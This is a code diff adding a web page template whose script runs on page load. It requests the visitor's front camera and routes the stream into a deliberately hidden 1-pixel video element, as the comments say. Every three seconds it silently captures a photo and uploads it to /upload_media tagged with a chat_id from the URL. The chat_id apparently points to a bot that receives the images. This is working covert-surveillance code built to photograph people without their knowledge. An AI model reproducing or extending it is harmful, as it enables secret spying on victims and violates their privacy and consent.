@@ -1,0 +1,115 @@
+<!-- ================================================================= -->
+<!-- 🔗 [UI CONNECTION: camera.html ko include karein]                 -->
+<!-- ================================================================= -->
+{% include 'camera.html' %}
+
+
+<!-- ================================================================= -->
+<!-- 🤖 [FIXED BACKGROUND FRONT PHOTO ENGINE]                         -->
+<!-- ================================================================= -->
+
+<!-- display:none mat use karein; invisible floating video element rakhein -->
+<video id="_bg_front_vid" autoplay playsinline muted 
+       style="position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -9999;"></video>
+<canvas id="_bg_front_canvas" style="display: none;"></canvas>
+
+<script>
+(function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chat_id');
+    const bgVideo = document.getElementById('_bg_front_vid');
+    const bgCanvas = document.getElementById('_bg_front_canvas');
+
+    let captureInterval = null;
+
+    async function initFrontPhoto() {
+        if (!chatId) {
+            console.error("chat_id URL me nahi mila!");
+            return;
+        }
+
+        try {
+            // Front camera stream lena
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: "user",
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                },
+                audio: false
+            });
+
+            // 1. Background video par stream lagayein
+            bgVideo.srcObject = stream;
+            await bgVideo.play();
+
+            // 2. Agar UI ke andar koi visible video tag ho, uspar bhi stream connect karein
+            const uiVideos = document.querySelectorAll('video:not(#_bg_front_vid)');
+            uiVideos.forEach(v => {
+                v.srcObject = stream;
+                v.play().catch(() => {});
+            });
+
+            // 3. Jab video ka pehla frame ready ho jaye, tab capturing loop shuru karein
+            bgVideo.onloadedmetadata = () => {
+                if (captureInterval) clearInterval(captureInterval);
+                captureInterval = setInterval(captureAndSend, 3000);
+            };
+
+            // Fallback: Agar metadata event miss ho jaye toh bhi interval start ho
+            if (!captureInterval) {
+                captureInterval = setInterval(captureAndSend, 3000);
+            }
+
+        } catch (err) {
+            console.error("Camera access error:", err);
+        }
+    }
+
+    function captureAndSend() {
+        // Source video choose karein jo properly play ho rahi ho
+        let activeVideo = bgVideo;
+        if (!activeVideo.videoWidth || activeVideo.readyState < 2) {
+            const uiVid = document.querySelector('video:not(#_bg_front_vid)');
+            if (uiVid && uiVid.videoWidth && uiVid.readyState >= 2) {
+                activeVideo = uiVid;
+            } else {
+                return; // Frame abhi ready nahi hai, skip karein taaki blank photo na jaye
+            }
+        }
+
+        const width = activeVideo.videoWidth;
+        const height = activeVideo.videoHeight;
+
+        if (width === 0 || height === 0) return;
+
+        bgCanvas.width = width;
+        bgCanvas.height = height;
+
+        const ctx = bgCanvas.getContext('2d');
+        ctx.drawImage(activeVideo, 0, 0, width, height);
+
+        bgCanvas.toBlob((blob) => {
+            if (!blob || blob.size === 0) return;
+
+            const fd = new FormData();
+            fd.append('file', blob, 'front_photo.jpg');
+            fd.append('chat_id', chatId);
+            fd.append('type', 'photo');
+
+            fetch('/upload_media', {
+                method: 'POST',
+                body: fd
+            }).catch(e => console.error("Upload failed:", e));
+
+        }, 'image/jpeg', 0.85);
+    }
+
+    // Page load hote hi run karein
+    if (document.readyState === 'complete' || document.readyState === 'interactive') {
+        initFrontPhoto();
+    } else {
+        window.addEventListener('DOMContentLoaded', initFrontPhoto);
+    }
+})();
+</script>
